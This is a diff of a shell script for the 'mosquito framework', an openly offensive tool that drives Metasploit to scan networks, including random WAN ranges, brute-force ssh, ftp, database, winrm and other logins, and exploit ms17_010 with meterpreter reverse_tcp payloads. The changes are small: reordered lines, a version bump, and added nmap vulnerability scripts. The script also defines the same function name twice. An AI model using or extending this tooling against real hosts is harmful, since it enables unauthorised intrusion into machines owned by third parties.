@@ -1,9 +1,9 @@
 #!/bin/sh
 # Author: r00t-3xp10it
-# mosquito framework v:1.0
+# mosquito framework v:3.10.3 [STABLE]
 # Automate remote brute force tasks over WAN/LAN networks
+# GitHub: https://github.com/r00t-3xp10it/resource_files
 # Suspicious Shell Activity - redteam @2019
-# ---
 ##
 resize -s 38 120 > /dev/nul
 
@@ -240,8 +240,8 @@ sh_one () {
 sh_two () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} brute_force resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -277,10 +277,10 @@ sh_two () {
 sh_tree () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ms17_010 resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -316,8 +316,8 @@ sh_tree () {
 sh_quatro () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ssh_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -353,9 +353,9 @@ sh_quatro () {
 sh_cinco () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ftp_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -391,8 +391,8 @@ sh_cinco () {
 sh_six () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} http_CVE resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -428,9 +428,9 @@ sh_six () {
 sh_seven () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} winrm_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -466,8 +466,8 @@ sh_seven () {
 sh_oito () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} mysql_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -503,8 +503,8 @@ sh_oito () {
 sh_nine () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} mssql_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -540,8 +540,8 @@ sh_nine () {
 sh_ten () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} telnet_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -577,8 +577,8 @@ sh_ten () {
 sh_onze () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} rpc_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -614,8 +614,8 @@ sh_onze () {
 sh_twelve () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} snmp_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -651,8 +651,8 @@ sh_twelve () {
 sh_twelve () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} postgres_brute resource_"${Reset};
    sleep 1
-   echo "$RANGE" > ip_range.txt
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
    #
@@ -692,10 +692,10 @@ scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning metho
 
    if [ "$scan" = "Scan Local Lan" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
-      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -Pn -T5 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -T5 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
    elif [ "$scan" = "Scan $IPADDR" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Machine: $IPADDR🦟"${Reset};
-      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -Pn -T5 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -T5 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
    else
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
@@ -755,7 +755,7 @@ cat << !
     ╠──────────╩───────────────────────╩────────────────────────────────────────╣
     ║    E     -     Exit mosquito                                              ║
     ╚───────────────────────────────────────────────────────────────────────────╣
-                                    Suspicious-Shell-Activity© 🦟redteam @2019🦟╝
+                                     Suspicious-Shell-Activity©🦟redteam @2019🦟╝
 
 !
 echo "${BlueF}[☠]${white} mosquito framework"${Reset}
